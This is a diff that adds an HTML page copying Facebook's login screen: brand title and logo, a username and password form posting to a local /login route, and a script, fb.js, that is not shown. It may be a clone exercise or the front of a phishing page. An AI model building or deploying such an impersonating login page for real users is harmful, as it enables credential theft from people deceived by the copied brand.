@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Login</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" href="/Sg2QOE06yVC.png" type="image/x-icon">
+</head>
+<body>
+    <p class="english">English(Uk)</p>
+    <img src="/Sg2QOE06yVC.png" alt="" class="logo">
+    <form action="/login" method="POST">
+        <input type="text" name="username" id="username"placeholder="Mobile number or email address" class="email" required>
+        <input type="password" name="password" id="password" placeholder="Password" class="password" required>
+        <button onclick="login()" type="submit" class="login">Log In</button>
+    </form>
+    <p class="Forgotten">Forgotten password?</p>
+    <button class="create">Create New Account</button> <br>
+    <img src="meta.png" alt="">
+    <div class="details">
+        <p><a href="#about">About</a></p>
+        <p><a href="#help">Help</a></p>
+        <p><a href="#more">More</a></p>
+    </div>
+    <p id="message"></p>
+
+    <script src="fb.js"></script>
+</body>
+</html>
